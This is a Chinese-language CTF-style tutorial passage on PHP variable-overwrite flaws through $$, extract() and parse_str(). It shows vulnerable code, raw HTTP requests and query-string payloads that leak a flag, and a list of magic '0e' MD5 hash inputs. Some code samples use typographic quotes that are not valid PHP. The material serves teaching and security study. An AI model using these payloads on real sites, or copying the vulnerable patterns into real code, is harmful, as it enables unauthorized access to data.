
# 3.6、**变量覆盖**

变量覆盖指的是用自定的参数值来替换程序原有的变量值，变量覆盖漏洞通常需要结合程序其他功能进行利用。大多由函数使用不当导致，主要有以下几个函数：

> $$，extract()，parse_str()，import_request_variables()等。 

开启了全局变量注册也容易导致变量覆盖。



## $$ 变量覆盖

使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。

**漏洞代码：**

```
<?php
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
show_source(__FILE__);

include "flag.php";


$_403 = "Access Denied";
$_200 = "Welcome Admin";
if ($_SERVER["REQUEST_METHOD"] != "POST")
	die("CTF is here :p...");
if ( !isset($_POST["flag"]) )
	die($_403);
foreach ($_GET as $key => $value)
	$$key = $$value;            // 变量覆盖
foreach ($_POST as $key => $value)
	$$key = $value;             //$$ 
if ( $_POST["flag"] !== $flag )
	die($_403);                 //方法2：出现flag的关键位置
echo "This is your flag : ". $flag . "\n";
die($_200);                     //方法1：出现flag的关键位置
?>
```

**代码分析**

题目中两个`foreach`使用了`$$`产生变量覆盖问题，满足条件后会将`$flag`里面的值打印出来。题目有三个if判断语句，当满足第一个if判断语句的条件，可以使用覆盖`$_200`或`$403`的方法打印出`$flag`变量的值。` die($_200)`或 `die($_403)`是可以将`$flag`打印出来的地方。

**Payload：**


- 方法1：
```
POST /shell.php?_200=flag HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=PHPSTORM
Connection: close
Content-Length: 6

flag=1
```
- 方法2：
```
POST /shell.php?_403=flag&_POST=1 HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=PHPSTORM
Connection: close
Content-Length: 6

flag=1
```



## extract()

**extract()** 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 



题目使用了**extract($_GET)**接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用**extract()**对变量进行覆盖，从而满足各个条件。



```
<?php
$flag = "xxx";
extract($_GET);
if (isset($gift)) {
   $content = trim(file_get_contents($flag));
   if ($gift == $content) {
       echo "hctf{xx}";
   } else {
       echo "Oh..";
    }
} 
?>
```

Payload:

```
http://localhost//shell.php?flag=&gift=
```

## parse_str()

如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。

```
void parse_str ( string $encoded_string [, array &$result ] )

encoded_string
输入的字符串。

result
如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。
```

**漏洞代码**

```
<?php
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
if (empty($_GET['id'])) {
    show_source(__FILE__);
    die();
} else {
   include (‘flag.php’);
   $a = “www.CTF.com”;
   $id = $_GET['id'];
    @parse_str($id);
    if ($a[0] != ‘QNKCDZO’ && md5($a[0]) == md5(‘QNKCDZO’)) {
        echo $flag;
    } else {
        exit(‘其实很简单其实并不难！’);
    }
}
?> 
```
**分析：**

代码首先要求使用GET提交id参数，然后`parse_str($id)对id`参数的数据进行处理，再使用判断`$a[0] != ‘QNKCDZO’ && md5($a[0]) == md5(‘QNKCDZO’)`的结果是否为真，为真就返回flag。

`md5(‘QNKCDZO’)`的结果是`0e830400451993494058024219903391`如果要满足if判断 `if ($a[0] != ‘QNKCDZO’ && md5($a[0]) == md5(‘QNKCDZO’))`就需要利用php弱语言特性。


**Payload：**

PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。

```
GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件。


# MD5加密后，以0e开头的值

QNKCDZO
0e830400451993494058024219903391
  
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
....
```

